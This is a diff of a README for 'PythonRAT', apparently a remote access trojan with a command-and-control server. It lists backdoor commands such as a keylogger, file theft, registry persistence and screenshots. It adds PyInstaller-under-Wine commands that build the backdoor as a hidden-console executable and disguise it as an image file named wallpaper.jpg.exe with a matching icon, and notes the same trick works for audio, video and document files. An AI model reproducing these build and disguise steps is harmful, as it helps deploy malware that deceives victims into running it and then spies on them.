@@ -40,14 +40,17 @@ PythonRAT is a Command and Control (C2) server which can control multiple machin
     cd *Directory name*                 --> Changes Directory On Target System
     upload *file name*                  --> Upload File To The Target Machine From Working Dir 
     download *file name*                --> Download File From Target Machine
-    get *url*                           --> Download File From Specified URL
+    get *url*                           --> Download File From Specified URL to Target ./
     keylog_start                        --> Start The Keylogger
     keylog_dump                         --> Print Keystrokes That The Target From taskmanager.txt
     keylog_stop                         --> Stop And Self Destruct Keylogger File
-    persistence *RegName* *filename*    --> Create Persistence In Registry (Windows)
-    check                               --> Check If Has Administrator Privileges (Windows)
     screenshot                          --> Takes screenshot and sends to server ./screenshots/
+    start *programName*                 --> Spawn Program Using backdoor e.g. 'start notepad'
     remove_backdoor                     --> Removes backdoor from target!!!
+    
+    ===Windows Only===
+    persistence *RegName* *filename*    --> Create Persistence In Registry
+    check                               --> Check If Has Administrator Privileges
 
 # Wine and Pyinstaller (Win version) Installation on Linux
 
@@ -91,19 +94,35 @@ or,
 
     # wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile --noconsole ~/backdoor.py
     
+**alternatively** if an _icon_ has already been created,
+    
+    # wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile --noconsole --icon ~/malware_128x128.ico ~/backdoor.py
+    
 This will produce _./dist/backdoor.exe_
 
 
-**Obfuscation using SFX archive**
+**Obfuscation using SFX Archive (Theory)**
 
 The executable _backdoor.exe_ will be made to look like an image (jpg) file.
 By default Windows does not show file extensions (e.g. backdoor.exe will show in Windows Explorer as backdoor).
 Hence, we will create an SFX archive name _wallpaper.jpg.exe_ which Windows Explorer will show as _wallpaper.jpg_.
 
-This will involve having image.jpg which we will also create an icon version of _.ico_ to assign the SFX archive.
+This will involve having an _image_ which we will also create an icon version of _.ico_ to assign the SFX archive.
 Making the executable appear to be an image.
 
-**Creating SFX archive**
+Of course this same method could be applied to audio, document or video file using an appopriate icon.
+
+**NOTE: SFX Archive**
+
+SFX archive is not the only method of obfuscating the executable.
+We can when compiling using _Pyinstaller_ add the argument _--add-data "/root/wallpaper.jpg;."_ with
+_--icon ~/wallpaper.ico_.
+
+    # wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile --noconsole --add-data "/root/wallpaper.jpg;." --icon ~/malware_128x128.ico ~/backdoor.py
+    # mv ./dist/_backdoor.exe_ ./dist/_wallpaper.jpg.exe_
+
+
+**Creating SFX Archive**
 
 WinRAR > Add To Archive (image.jpg and backdoor.exe)
 
